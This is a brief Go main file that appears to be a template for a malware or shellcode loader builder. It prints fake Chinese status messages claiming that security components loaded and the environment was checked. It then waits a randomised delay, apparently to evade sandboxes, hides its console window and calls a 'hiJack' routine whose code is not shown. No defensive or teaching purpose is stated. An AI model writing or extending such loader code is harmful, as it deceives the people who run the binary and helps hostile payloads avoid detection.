package main

import (
	"flag"
	"fmt"
	"sync"
	"time"
)

var (
	console bool
)

func main() {
	initialize()
	//Welcome
	fmt.Println("[√] 成功加载安全组件")
	fmt.Println("[√] 检查运行环境...")
	time.Sleep(time.Second * time.Duration(2+time.Now().Unix()%5))
	time.Sleep(time.Second * 3)

	showWindow(console)
	wg := sync.WaitGroup{}
	wg.Add(1)
	go func() {
		showWindow(false)
		//defer wg.Done()
		fmt.Println("[+] Calling hijack")
		hiJack()
		fmt.Println("[+] Bye~")
	}()
	wg.Wait()
}

func initialize() {
	if "{{.LOADER}}" == "pe" {
		console = true
	} else {
		flag.BoolVar(&console, "console", false, "信息输出")
		flag.Parse()
	}
}
